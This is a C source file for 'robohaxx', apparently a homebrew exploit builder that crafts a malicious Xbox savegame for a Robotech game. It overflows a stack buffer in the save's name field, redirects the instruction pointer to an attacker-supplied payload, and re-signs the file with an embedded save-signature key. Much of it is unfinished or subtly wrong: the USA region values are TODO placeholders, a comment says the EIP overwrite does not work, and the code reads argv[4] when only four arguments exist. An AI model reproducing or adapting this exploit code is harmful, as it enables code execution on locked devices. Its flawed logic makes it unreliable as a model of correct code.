#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <stdbool.h>
#include <sys/types.h>
#include <sys/stat.h>
#include "hmac_sha1.h"

//#define SAVEGAME_DATA_LENGTH 0x2E4
#define SAVEGAME_DATA_LENGTH 0x2048

// the length of the string before overriding eip is, theoretically, fair game to change whatever in
#define MAX_XOR_PAYLOAD_LENGTH 0x1FC

// !! this entire datatype must not contain any NULL bytes !!
typedef struct _RobohaxxOverflow_t {
    char overflow[MAX_XOR_PAYLOAD_LENGTH];
    uint32_t eip_save; // the address of code to redirect to
    uint32_t more_stack[8];
} RobohaxxOverflow_t;

#define MAX_EXTRA_PAYLOAD_LENGTH SAVEGAME_DATA_LENGTH - 0x8 - sizeof(RobohaxxOverflow_t)

// "structure" of the hacked save
typedef struct _RobohaxxSave_t {
    uint32_t length;
    uint8_t checksum[0x14];
    union {
        struct {
            uint8_t unk[0x8];
            RobohaxxOverflow_t name;
            uint8_t extra_payload[MAX_EXTRA_PAYLOAD_LENGTH]; // max save length
        } save;
        uint8_t save_bytes[SAVEGAME_DATA_LENGTH];
    };
} RobohaxxSave_t;

// static address where the savegame gets loaded straight from the file into
#define EUR_SAVEGAME_ADDRESS 0x0041E20C
#define USA_SAVEGAME_ADDRESS 0xE621E621 // TODO
static uint32_t savegame_address = 0;

// save file signature keys, generated from HMAC_SHA1(XboxSignatureKey, RobotechXBEKey)[0:16]
#define SIG_KEY_LEN 0x10
static const uint8_t game_sig_key_EUR[SIG_KEY_LEN] = { 0x82, 0xe1, 0x75, 0x30, 0x4a, 0x3f, 0x85, 0xc1, 0xd1, 0x85, 0xc1, 0x23, 0x25, 0xfb, 0x11, 0x0d };
static const uint8_t game_sig_key_USA[SIG_KEY_LEN] = { 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41 }; // TODO
static const uint8_t *game_sig_key = NULL;

static char *output_filename = "game.xsv";

static int print_usage(char *filename) {
    printf("usage: %s [path to payload] [U/E] [optional output path, default game.xsv] [optional eip overwrite address]\n", filename);
    return -1;
}
static int print_error(char *error) {
    fprintf(stderr, "error: %s\n", error);
    return -1;
}

static void hexdump(const uint8_t *data, const size_t len) {
    for (size_t i = 0; i < len; i++)
        printf("%02x", data[i]);
}

int main(int argc, char **argv) {
    printf("robohaxx game.xsv builder by InvoxiPlayGames\n"
           "https://github.com/InvoxiPlayGames/robohaxx\n\n");
    if (argc < 3)
        return print_usage(argv[0]);

    // make sure the provided region is correct, and set the target address
    if (strlen(argv[2]) != 1) 
        return print_error("argument too long to be a region");
    if (argv[2][0] == 'E' || argv[2][0] == 'e') {
        savegame_address = EUR_SAVEGAME_ADDRESS;
        game_sig_key = game_sig_key_EUR;
    } else if (argv[2][0] == 'U' || argv[2][0] == 'u') {
        savegame_address = USA_SAVEGAME_ADDRESS;
        game_sig_key = game_sig_key_USA;
    } else
        return print_error("invalid region provided, must be E or U");
    printf("savegame address: %08x\n", savegame_address);
    
    // read the payload file and get the filesize
    FILE *payload_fp = fopen(argv[1], "rb");
    if (payload_fp == NULL)
        return print_error("payload file could not be opened");
    fseek(payload_fp, 0, SEEK_END);
    long payload_len = ftell(payload_fp);
    fseek(payload_fp, 0, SEEK_SET);
    printf("payload length: %li\n", payload_len);

    // we can't have this
    if (payload_len > MAX_EXTRA_PAYLOAD_LENGTH || payload_len < 2)
        return print_error("payload is too large or short");

    // allocate a buffer for the payload and read it
    uint8_t *payload = malloc(payload_len);
    if (payload == NULL)
        return print_error("failed to allocate buffer for payload");
    if (fread(payload, 1, payload_len, payload_fp) < payload_len)
        return print_error("failed to read entire payload into memory");
    fclose(payload_fp);

    // allocate a buffer for our savegame
    RobohaxxSave_t *save = malloc(sizeof(RobohaxxSave_t));
    if (save == NULL)
        return print_error("failed to allocate buffer for our savegame");
    // whoops! all zeroes
    memset(save, 0, sizeof(RobohaxxSave_t));

    // fill in the string with nulls
    memset(save->save.name.overflow, 'A', sizeof(save->save.name.overflow));
    // set the instruction pointer to our code
    // this doesn't actually work - the highest byte (a NULL) gets replaced with 0x0A because of the newline
    // so we should really figure out how to make a ROP chain
    // the rest of our string is kinda on the stack at the "esp"
    save->save.name.eip_save = savegame_address + 0x8 + sizeof(RobohaxxOverflow_t);
    if (argc >= 4) save->save.name.eip_save = strtol(argv[4], NULL, 0);
    // set the values after this on the stack to our code
    for (int i = 0; i < 8; i++)
        save->save.name.more_stack[i] = savegame_address + 0x8 + sizeof(RobohaxxOverflow_t);
    printf("eip save set to 0x%08x\n", save->save.name.eip_save);

    // straight copy the payload to the extra data in the save
    memcpy(save->save.extra_payload, payload, payload_len);

    // set the length
    save->length = SAVEGAME_DATA_LENGTH;
    // prepare the xbox savegame signature
    HMAC_SHA1(game_sig_key, SIG_KEY_LEN, save->save_bytes, save->length, save->checksum);

    printf("generated signature: ");
    hexdump(save->checksum, sizeof(save->checksum));
    printf("\n");
    
    if (argc >= 4) output_filename = argv[3];

    printf("writing savegame to %s\n", output_filename);

    FILE *gci_fp = fopen(output_filename, "wb+");
    if (gci_fp == NULL)
        return print_error("output file could not be opened");
    if (fwrite(save, sizeof(RobohaxxSave_t), 1, gci_fp) < 1)
        return print_error("failed to write to output file");
    fclose(gci_fp);

    printf("successfully written output savegame!\n");

    // clean up and free everything
    free(save);
    free(payload);
    return 0;
}
